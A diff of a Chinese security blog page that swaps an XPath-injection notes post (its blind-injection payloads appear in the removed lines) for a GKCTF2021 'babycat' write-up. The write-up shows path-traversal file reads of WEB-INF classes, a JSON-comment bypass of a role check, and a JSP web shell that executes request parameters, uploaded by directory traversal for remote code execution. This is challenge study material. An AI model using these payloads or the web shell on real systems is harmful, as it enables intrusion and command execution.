@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Xpath笔记 | 甜筒园</title>
-  <meta name="keywords" content=" XPath注入 ">
-  <meta name="description" content="Xpath笔记 | 甜筒园">
+  <title>GKCTF2021 babycat | 甜筒园</title>
+  <meta name="keywords" content=" 文件上传 , 任意文件读取 , JAVA安全 ">
+  <meta name="description" content="GKCTF2021 babycat | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="打开靶机是一个登录界面，先注册一个号，弹窗提示Not Allowed，抓包查看注册界面源码： &lt;html&gt; &lt;head&gt;     &lt;title&gt;Register&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;script&gt;alert(&#39;Not Allowed&#39;)&lt;&#x2F;script&gt; &amp;">
 <meta property="og:type" content="article">
@@ -461,9 +461,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-XPath注入" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-GKCTF2021-babycat" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Xpath笔记</h1>
+        <h1 class="article-title">GKCTF2021 babycat</h1>
     
     <div class="article-meta">
         
@@ -473,7 +473,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="笔记">笔记</a>
+            <a  data-rel="Writeup">Writeup</a>
             
         </span>
         
@@ -481,19 +481,23 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color3">XPath注入</a>
+            <a class="color5">文件上传</a>
+            
+            <a class="color2">任意文件读取</a>
+            
+            <a class="color2">JAVA安全</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-15 17:53:35'>2023-03-11 21:17</time>
+            Created At : <time class="date" title='Updated At: 2023-04-01 19:44:47'>2023-04-01 19:45</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.4k</span>
+        <span>Count:1.5k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -523,7 +527,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%AF%AD%E6%B3%95"><span class="toc-text">一、语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E5%8F%96%E8%8A%82%E7%82%B9"><span class="toc-text">选取节点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%93%E8%AF%AD%EF%BC%88Predicates%EF%BC%89"><span class="toc-text">谓语（Predicates）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E5%8F%96%E6%9C%AA%E7%9F%A5%E8%8A%82%E7%82%B9"><span class="toc-text">选取未知节点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B3%A8%E5%85%A5"><span class="toc-text">二、注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-text">常规注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-text">盲注：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -539,298 +543,238 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="一、语法"><a href="#一、语法" class="headerlink" title="一、语法"></a>一、语法</h2><h3 id="选取节点"><a href="#选取节点" class="headerlink" title="选取节点"></a>选取节点</h3><table>
-<thead>
-<tr>
-<th align="left">表达式</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">nodename</td>
-<td align="left">选取此节点的所有子节点。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;</td>
-<td align="left">从根节点选取（取子节点）。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;&#x2F;</td>
-<td align="left">从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置（取子孙节点）。</td>
-</tr>
-<tr>
-<td align="left">.</td>
-<td align="left">选取当前节点。</td>
-</tr>
-<tr>
-<td align="left">..</td>
-<td align="left">选取当前节点的父节点。</td>
-</tr>
-<tr>
-<td align="left">@</td>
-<td align="left">选取属性。</td>
-</tr>
-</tbody></table>
-<p>在下面的表格中，我们已列出了一些路径表达式以及表达式的结果：</p>
-<table>
-<thead>
-<tr>
-<th align="left">路径表达式</th>
-<th align="left">结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">bookstore</td>
-<td align="left">选取 bookstore 元素的所有子节点。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;bookstore</td>
-<td align="left">选取根元素 bookstore。注释：假如路径起始于正斜杠( &#x2F; )，则此路径始终代表到某元素的绝对路径！</td>
-</tr>
-<tr>
-<td align="left">bookstore&#x2F;book</td>
-<td align="left">选取属于 bookstore 的子元素的所有 book 元素。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;&#x2F;book</td>
-<td align="left">选取所有 book 子元素，而不管它们在文档中的位置。</td>
-</tr>
-<tr>
-<td align="left">bookstore&#x2F;&#x2F;book</td>
-<td align="left">选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;&#x2F;@lang</td>
-<td align="left">选取名为 lang 的所有属性。</td>
-</tr>
-</tbody></table>
-<hr>
-<h3 id="谓语（Predicates）"><a href="#谓语（Predicates）" class="headerlink" title="谓语（Predicates）"></a>谓语（Predicates）</h3><p>谓语用来查找某个特定的节点或者包含某个指定的值的节点。</p>
-<p>谓语被嵌在方括号中。</p>
-<p>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p>
-<table>
-<thead>
-<tr>
-<th align="left">路径表达式</th>
-<th align="left">结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">&#x2F;bookstore&#x2F;book[1]</td>
-<td align="left">选取属于 bookstore 子元素的第一个 book 元素。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;bookstore&#x2F;book[last()]</td>
-<td align="left">选取属于 bookstore 子元素的最后一个 book 元素。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;bookstore&#x2F;book[last()-1]</td>
-<td align="left">选取属于 bookstore 子元素的倒数第二个 book 元素。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;bookstore&#x2F;book[position()&lt;3]</td>
-<td align="left">选取最前面的两个属于 bookstore 元素的子元素的 book 元素。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;&#x2F;title[@lang]</td>
-<td align="left">选取所有拥有名为 lang 的属性的 title 元素。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;&#x2F;title[@lang&#x3D;’eng’]</td>
-<td align="left">选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;bookstore&#x2F;book[price&gt;35.00]</td>
-<td align="left">选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;bookstore&#x2F;book[price&gt;35.00]&#x2F;&#x2F;title</td>
-<td align="left">选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</td>
-</tr>
-</tbody></table>
-<hr>
-<h3 id="选取未知节点"><a href="#选取未知节点" class="headerlink" title="选取未知节点"></a>选取未知节点</h3><p>XPath 通配符可用来选取未知的 XML 元素。</p>
-<table>
-<thead>
-<tr>
-<th align="left">通配符</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">*</td>
-<td align="left">匹配任何元素节点。</td>
-</tr>
-<tr>
-<td align="left">@*</td>
-<td align="left">匹配任何属性节点。</td>
-</tr>
-<tr>
-<td align="left">node()</td>
-<td align="left">匹配任何类型的节点。</td>
-</tr>
-</tbody></table>
-<p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p>
-<table>
-<thead>
-<tr>
-<th align="left">路径表达式</th>
-<th align="right">结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">&#x2F;bookstore&#x2F;*</td>
-<td align="right">选取 bookstore 元素的所有子元素。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;&#x2F;*</td>
-<td align="right">选取文档中的所有元素。</td>
-</tr>
-<tr>
-<td align="left">&#x2F;&#x2F;title[@*]</td>
-<td align="right">选取所有带有属性的 title 元素。</td>
-</tr>
-</tbody></table>
-<h2 id="二、注入"><a href="#二、注入" class="headerlink" title="二、注入"></a>二、注入</h2><h3 id="常规注入："><a href="#常规注入：" class="headerlink" title="常规注入："></a>常规注入：</h3><pre><code class="python">//原php代码中的查询语句
+        <p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230331192344361.png" alt="image-20230331192344361"></p>
+<p>打开靶机是一个登录界面，先注册一个号，弹窗提示<code>Not Allowed</code>，抓包查看注册界面源码：</p>
+<pre><code class="html">&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Register&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;alert(&#39;Not Allowed&#39;)&lt;/script&gt;
+&lt;script src=&quot;http://code.jquery.com/jquery-latest.js&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    // var obj=&#123;&#125;;
+    // obj[&quot;username&quot;]=&#39;test&#39;;
+    // obj[&quot;password&quot;]=&#39;test&#39;;
+    // obj[&quot;role&quot;]=&#39;guest&#39;;
+    function doRegister(obj)&#123;
+        if(obj.username==null || obj.password==null)&#123;
+            alert(&quot;用户名或密码不能为空&quot;);
+        &#125;else&#123;
+            var d = new Object();
+            d.username=obj.username;
+            d.password=obj.password;
+            d.role=&quot;guest&quot;;
 
-
-
-$query=&quot;user/username[@name=&#39;&quot;.$user.&quot;&#39;]&quot;;
-
-
-
-//构造1：user1&#39; or 1=1 or &#39;&#39;=&#39;
-
-
-
-$query=&quot;user/username[@name=&#39;user1&#39; or 1=1 or &#39;&#39;=&#39;&#39;]&quot;;
-
-
-
-//构造2：&#39;]|//*|//*[&#39;
-
-
-
-$query=&quot;user/username[@name=&#39;user1&#39;]|//*|//*[&#39;&#39;]&quot;;
+            $.ajax(&#123;
+                url:&quot;/register&quot;,
+                type:&quot;post&quot;,
+                contentType: &quot;application/x-www-form-urlencoded; charset=utf-8&quot;,
+                data: &quot;data=&quot;+JSON.stringify(d),
+                dataType: &quot;json&quot;,
+                success:function(data)&#123;
+                    alert(data)
+                &#125;
+            &#125;);
+        &#125;
+    &#125;
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 </code></pre>
-<h3 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h3><p>从根节点开始判断：</p>
-<pre><code class="csharp">&#39;or count(/)=1  or &#39;&#39;=&#39;     ###根节点数量为1
-
-
-
-&#39;or count(/*)=1 or &#39;&#39;=&#39;   ##根节点下只有一个子节点
+<p>通过源码可以看到，虽然他弹出了<code>Not Allowed</code>，但后续的代码仍在执行，POST发包给data传入一个json格式注册：</p>
+<pre><code>POST
+data=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;
 </code></pre>
-<p>判断根节点下的节点长度为8：</p>
-<pre><code class="csharp">&#39;or string-length(name(/*[1]))=8 or &#39;&#39;=&#39;
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230331193038872.png" alt="image-20230331193038872"></p>
+<p>注册成功，拿账号密码登录进入主界面：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230331193223682.png" alt="image-20230331193223682"></p>
+<p>可以看到有文件上传和文件下载两个功能，上传功能只有admin权限的账户可以使用，先看看文件下载处有没有漏洞。用<code>Wappalyzer</code>看了一眼是JAVA环境，抓包读取<code>web.xml</code>：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230331194240058.png" alt="image-20230331194240058"></p>
+<pre><code class="xml">&lt;!DOCTYPE web-app PUBLIC
+ &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;
+ &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;
+
+&lt;web-app&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;register&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.registerServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;login&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.loginServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;home&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.homeServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.uploadServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;download&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.downloadServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet&gt;
+    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.web.servlet.logoutServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/logout&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;download&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/home/download&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;register&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/register&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;display-name&gt;java&lt;/display-name&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;login&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/login&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;home&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/home&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/home/upload&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+
+  &lt;filter&gt;
+    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;
+    &lt;filter-class&gt;com.web.filter.LoginFilter&lt;/filter-class&gt;
+  &lt;/filter&gt;
+  &lt;filter-mapping&gt;
+    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;/home/*&lt;/url-pattern&gt;
+  &lt;/filter-mapping&gt;
+  &lt;display-name&gt;java&lt;/display-name&gt;
+
+  &lt;welcome-file-list&gt;
+    &lt;welcome-file&gt;/WEB-INF/index.jsp&lt;/welcome-file&gt;
+  &lt;/welcome-file-list&gt;
+&lt;/web-app&gt;
 </code></pre>
-<p>猜解根节点下的节点名称：</p>
-<pre><code class="csharp">&#39;or substring(name(/*[1]), 1, 1)=&#39;a&#39;  or &#39;&#39;=&#39;
-
-
-
-&#39;or substring(name(/*[1]), 2, 1)=&#39;c&#39;  or &#39;&#39;=&#39;
-
-
-
-..
-
-
-
-&#39;or substring(name(/*[1]), 8, 1)=&#39;s&#39;  or &#39;&#39;=&#39;
+<p>看到注册需要的class文件路径，读取一下：</p>
+<pre><code>http://6324b375-e066-4101-9815-6d331a45783c.node4.buuoj.cn:81/home/download?file=../../WEB-INF/classes/com/web/servlet/registerServlet.class
 </code></pre>
-<p>猜解出该节点名称为accounts</p>
-<pre><code class="cobol">&#39;or count(/accounts)=1  or &#39;&#39;=&#39;   /accounts节点数量为1
+<p>用<code>jd-jui</code>工具打开：</p>
+<pre><code class="java">import com.google.gson.Gson;
+import com.mysql.cj.util.StringUtils;
+import com.web.dao.Person;
+import com.web.dao.baseDao;
+import java.io.IOException;
+import java.sql.Connection;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+import javax.servlet.ServletException;
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
-
-
-&#39;or count(/accounts/user/*)&gt;0 or &#39;&#39;=&#39;     /accounts下有两个节点
-
-
-
- 
-
-
-
-&#39;or string-length(name(/accounts/*[1]))=4  or &#39;&#39;=&#39;    第一个子节点长度为4
+public class registerServlet extends HttpServlet &#123;
+  protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+    resp.setContentType(&quot;text/html;charset=UTF-8&quot;);
+    req.setAttribute(&quot;error&quot;, &quot;&lt;script&gt;alert(&#39;Not Allowed&#39;)&lt;/script&gt;&quot;);
+    req.getRequestDispatcher(&quot;WEB-INF/register.jsp&quot;).forward((ServletRequest)req, (ServletResponse)resp);
+  &#125;
+  
+  protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+    resp.setCharacterEncoding(&quot;UTF-8&quot;);
+    Integer res = Integer.valueOf(0);
+    String role = &quot;&quot;;
+    Gson gson = new Gson();
+    Person person = new Person();
+    Connection connection = null;
+    String var = req.getParameter(&quot;data&quot;).replaceAll(&quot; &quot;, &quot;&quot;).replace(&quot;&#39;&quot;, &quot;\&quot;&quot;);
+    Pattern pattern = Pattern.compile(&quot;\&quot;role\&quot;:\&quot;(.*?)\&quot;&quot;);
+    Matcher matcher = pattern.matcher(var);
+    while (matcher.find())
+      role = matcher.group(); 
+    if (!StringUtils.isNullOrEmpty(role)) &#123;
+      var = var.replace(role, &quot;\&quot;role\&quot;:\&quot;guest\&quot;&quot;);
+      person = (Person)gson.fromJson(var, Person.class);
+    &#125; else &#123;
+      person = (Person)gson.fromJson(var, Person.class);
+      person.setRole(&quot;guest&quot;);
+    &#125; 
+    System.out.println(person);
+    if (person.getUsername() == null || person.getPassword() == null)
+      resp.sendError(500, &quot;); 
+    person.setPic(&quot;/static/cat.gif&quot;);
+    try &#123;
+      connection = baseDao.getConnection();
+    &#125; catch (Exception e) &#123;
+      e.printStackTrace();
+    &#125; 
+    if (connection != null) &#123;
+      String sql_query = &quot;select * from ctf where username=?&quot;;
+      Object[] params1 = &#123; person.getUsername() &#125;;
+      try &#123;
+        ResultSet rs = baseDao.execute(connection, sql_query, params1);
+        if (rs.next()) &#123;
+          System.out.println(rs.next());
+          resp.sendError(500, &quot;user already exists!&quot;);
+        &#125; else &#123;
+          String sql = &quot;insert into ctf (username,password,role,pic) values (?,?,?,?)&quot;;
+          Object[] params2 = &#123; person.getUsername(), person.getPassword(), person.getRole(), person.getPic() &#125;;
+          res = Integer.valueOf(baseDao.Update(connection, sql, params2));
+        &#125; 
+      &#125; catch (SQLException e) &#123;
+        e.printStackTrace();
+      &#125; 
+      baseDao.closeResource(connection, null, null);
+    &#125; 
+    if (res.intValue() == 1)
+      resp.getWriter().write(&quot;register success!&quot;); 
+  &#125;
+&#125;
 </code></pre>
-<p>猜解accounts下的节点名称：</p>
-<pre><code class="python">&#39;or substring(name(/accounts/*[1]), 1, 1)=&#39;u&#39;  or &#39;&#39;=&#39;
-
-
-
-...
-
-
-
-&#39;or substring(name(/accounts/*[1]), 4, 1)=&#39;r&#39;  or &#39;&#39;=&#39;
+<p>看到对role处有正则表达式限制用户属性是guest，这里可以用多行注释绕过正则匹配，注册admin用户：</p>
+<pre><code>POST /register
+data=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;/*,&quot;role&quot;:&quot;guest&quot;*/&#125;
 </code></pre>
-<p>accounts下子节点名称为user</p>
-<pre><code class="sql">&#39;or count(/accounts/user)=2  or &#39;&#39;=&#39;    user节点有两个，则可以猜测出accounts节点结构，accounts下两个节点，均为user节点
+<p>再查看一下上传文件的class文件：</p>
+<pre><code>http://6324b375-e066-4101-9815-6d331a45783c.node4.buuoj.cn:81/home/download?file=../../WEB-INF/classes/com/web/servlet/uploadServlet.class
 </code></pre>
-<p>第一个user节点的子节点长度为8：<br>‘or string-length(name(&#x2F;accounts&#x2F;user[position()&#x3D;1]&#x2F;*[1]))&#x3D;8 or ‘’&#x3D;’</p>
-<p>读取user节点的下子节点</p>
-<pre><code class="python">&#39;or substring(name(/accounts/user[position()=1]/*[1]), 1, 1)=&#39;u&#39;  or &#39;&#39;=&#39;
-
-
-
-&#39;or substring(name(/accounts/user[position()=1]/*[1]), 2, 1)=&#39;s&#39;  or &#39;&#39;=&#39;
-
-
-
-...
-
-
-
-&#39;or substring(name(/accounts/user[position()=1]/*[1]), 8, 1)=&#39;e&#39;  or &#39;&#39;=&#39;
+<p>看到其中一段代码：</p>
+<pre><code class="java">if (checkExt(ext) || checkContent(item.getInputStream())) &#123;
+    req.setAttribute(&quot;error&quot;, &quot;upload failed&quot;);
+    req.getRequestDispatcher(&quot;../WEB-INF/upload.jsp&quot;).forward(req, resp);
+&#125;
+item.write(new File(uploadPath + File.separator + name + ext));
+req.setAttribute(&quot;error&quot;, &quot;upload success!&quot;);
 </code></pre>
-<p>最终所有子节点值验证如下：</p>
-<pre><code class="csharp">&#39;or substring(name(/accounts/user[position()=1]/*[1]), 1)=&#39;username&#39;  or &#39;&#39;=&#39;
-
-
-
-&#39;or substring(name(/accounts/user[position()=1]/*[2]), 1)=&#39;email&#39;  or &#39;&#39;=&#39;
-
-
-
-&#39;or substring(name(/accounts/user[position()=1]/*[3]), 1)=&#39;accounttype&#39;  or &#39;&#39;=&#39;
-
-
-
-&#39;or substring(name(/accounts/user[position()=1]/*[4]), 1)=&#39;password&#39;  or &#39;&#39;=&#39;
+<p>这里虽然显示上传失败，但没用return跳出，实际上还是上传到目录中去了，所以我们直接传马到目录</p>
+<p>木马内容：</p>
+<pre><code class="jsp">&lt;%
+    if(&quot;b&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
+        int a=-1;
+        byte[] b=new byte[2048];
+        out.print(&quot;&lt;pro&gt;&quot;);
+        while((a=in.read(b))!=-1)&#123;
+            out.println(new String(b));
+        &#125;
+        out.print(&quot;&lt;/pre&gt;&quot;);
+    &#125;
+%&gt;
 </code></pre>
-<p>继续猜解：</p>
-<pre><code class="csharp">&#39;or count(/accounts/user[position()=1]/username/*)&gt;0 or &#39;&#39;=&#39;   
-
-
-
-&#39;or count(/accounts/user[position()=1]/email/*)&gt;0 or &#39;&#39;=&#39; 
-
-
-
-&#39;or count(/accounts/user[position()=1]/accounttype/*)&gt;0 or &#39;&#39;=&#39;
-
-
-
-&#39;or count(/accounts/user[position()=1]/username/password/*)&gt;0 or &#39;&#39;=&#39;
-</code></pre>
-<p>均为 false，不再有子节点，则可以尝试读取这些节点的值</p>
-<p>第一个user下的username值长度为6:</p>
-<pre><code class="csharp">&#39;or string-length((//user[position()=1]/username[position()=1]))=6  or &#39;&#39;=&#39;
-</code></pre>
-<p>读取第一个user下usernaem的值</p>
-<pre><code class="csharp">&#39;or substring((//user[position()=1]/username[position()=1]),1,1)=&#39;T&#39;  or &#39;&#39;=&#39;
-
-
-
-....
-
-
-
-&#39;or substring((//user[position()=1]/username[position()=1]),6,1)=&#39;e&#39;  or &#39;&#39;=&#39;
-</code></pre>
-<p>可依次读取所有的子节点的值，第二user节点的子节点值读取方式：</p>
-<pre><code class="sql">&#39;or string-length((//user[position()=2]/username[position()=1]))=4 or &#39;&#39;=&#39;  第一个user下的username长度为4
-</code></pre>
+<p>由于upload目录不可读，我们目录穿越上传到static目录下：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230401193946828.png" alt="image-20230401193946828"></p>
+<p>访问<code>./static/shell.jsp</code>进行RCE获取flag:</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230401194215252.png" alt="image-20230401194215252"></p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="http://www.hackdig.com/06/hack-391147.htm">【WP】GKCTF2021 By EDI战队</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
